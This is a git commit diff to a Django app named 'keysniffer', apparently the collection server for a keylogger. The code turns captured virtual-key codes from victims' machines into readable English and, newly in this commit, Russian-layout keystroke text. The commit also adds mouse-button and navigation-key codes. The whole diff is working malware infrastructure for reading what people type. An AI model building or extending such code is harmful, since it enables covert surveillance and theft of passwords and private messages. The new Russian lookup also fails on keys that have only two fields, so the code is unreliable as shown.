7b1acfed89cafa4b90febfdc7f7da816012468a8
Dragon <akbarisroilovdragon@gmail.com>
2022-09-29 13:02:47 +0500

    adding ru humanf readable to getdata function

--- roben/keysniffer/urls.py
+++ roben/keysniffer/urls.py
@@ -1,6 +1,8 @@
 
 
 from django.urls import path
+from django.views.generic import TemplateView
+
 from . import views
 
 urlpatterns = [
@@ -8,4 +10,6 @@ urlpatterns = [
     path('', views.ping),
     path('data/<str:code>', views.getData),
     path('delete/<int:id>', views.deleteData),
+    path('index/', TemplateView.as_view(template_name='index.html')),
+
 ]
--- roben/keysniffer/views.py
+++ roben/keysniffer/views.py
@@ -11,43 +11,43 @@ from .serializers import LogSerializer, GetLogSerializer
 
 KEYS = [
     # from 0 to 9
-    [0x30, '0'],
-    [0x31, '1'],
-    [0x32, '2'],
-    [0x33, '3'],
-    [0x34, '4'],
-    [0x35, '5'],
-    [0x36, '6'],
-    [0x37, '7'],
-    [0x38, '8'],
-    [0x39, '9'],
+    [0x30, '0', '0'],
+    [0x31, '1', '1'],
+    [0x32, '2', '2'],
+    [0x33, '3', '3'],
+    [0x34, '4', '4'],
+    [0x35, '5', '5'],
+    [0x36, '6', '6'],
+    [0x37, '7', '7'],
+    [0x38, '8', '8'],
+    [0x39, '9', '9'],
     # from A to Z
-    [0x41, 'a'],
-    [0x42, 'b'],
-    [0x43, 'c'],
-    [0x44, 'd'],
-    [0x45, 'e'],
-    [0x46, 'f'],
-    [0x47, 'g'],
-    [0x48, 'h'],
-    [0x49, 'i'],
-    [0x4A, 'j'],
-    [0x4B, 'k'],
-    [0x4C, 'l'],
-    [0x4D, 'm'],
-    [0x4E, 'n'],
-    [0x4F, 'o'],
-    [0x50, 'p'],
-    [0x51, 'q'],
-    [0x52, 'r'],
-    [0x53, 's'],
-    [0x54, 't'],
-    [0x55, 'u'],
-    [0x56, 'v'],
-    [0x57, 'w'],
-    [0x58, 'x'],
-    [0x59, 'y'],
-    [0x5A, 'z'],
+    [0x41, 'a', 'ф'],
+    [0x42, 'b', 'и'],
+    [0x43, 'c', 'с'],
+    [0x44, 'd', 'в'],
+    [0x45, 'e', 'у'],
+    [0x46, 'f', 'а'],
+    [0x47, 'g', 'п'],
+    [0x48, 'h', 'р'],
+    [0x49, 'i', 'ш'],
+    [0x4A, 'j', 'о'],
+    [0x4B, 'k', 'л'],
+    [0x4C, 'l', 'д'],
+    [0x4D, 'm', 'ь'],
+    [0x4E, 'n', 'т'],
+    [0x4F, 'o', 'щ'],
+    [0x50, 'p', 'з'],
+    [0x51, 'q', 'й'],
+    [0x52, 'r', 'к'],
+    [0x53, 's', 'ы'],
+    [0x54, 't', 'е'],
+    [0x55, 'u', 'г'],
+    [0x56, 'v', 'м'],
+    [0x57, 'w', 'ц'],
+    [0x58, 'x', 'ч'],
+    [0x59, 'y', 'н'],
+    [0x5A, 'z', 'я'],
     # BACKSPACE
     [0x08, '[BACK]'],
     # TAB
@@ -59,7 +59,29 @@ KEYS = [
     # CAPS LOCK
     [0x14, '[CAPS]'],
     # SPACE
-    [0x20, ' ']
+    [0x20, ' '],
+    # CTRL
+    [0x11, '[CTRL]'],
+    # Left mouse button
+    [0x01, '[LM]'],
+    # Right mouse button
+    [0x02, '[RM]'],
+    # ALT key
+    [0x12, '[ALT]'],
+    # PAUSE key
+    [0x13, '[PAUSE]'],
+    # 	LEFT ARROW key
+    [0x25, '[LEFT]'],
+    # UP ARROW key
+    [0x26, '[UP]'],
+    # RIGHT ARROW key
+    [0x27, '[RIGHT]'],
+    # DOWN ARROW key
+    [0x28, '[DOWN]'],
+    # INS key
+    [0x2D, '[INS]'],
+    # DEL key
+    [0x2E, '[DEL]'],
 ]
 
 @api_view(['GET', 'POST'])
@@ -98,13 +120,16 @@ def getData(request, code):
     for l in logSerializer.data:
         data = l["data"].split(',')
         humanReadableData = ""
+        russianHumanReadableData = ""
         for d in data:
             for k in KEYS:
                 if d != '' and k[0] == int(d):
                     humanReadableData += k[1]
+                    russianHumanReadableData += k[2]
                     break
             
         l["hr"] = humanReadableData
+        l["ruhr"] = russianHumanReadableData
     return Response(logSerializer.data, status=status.HTTP_200_OK)
 
 
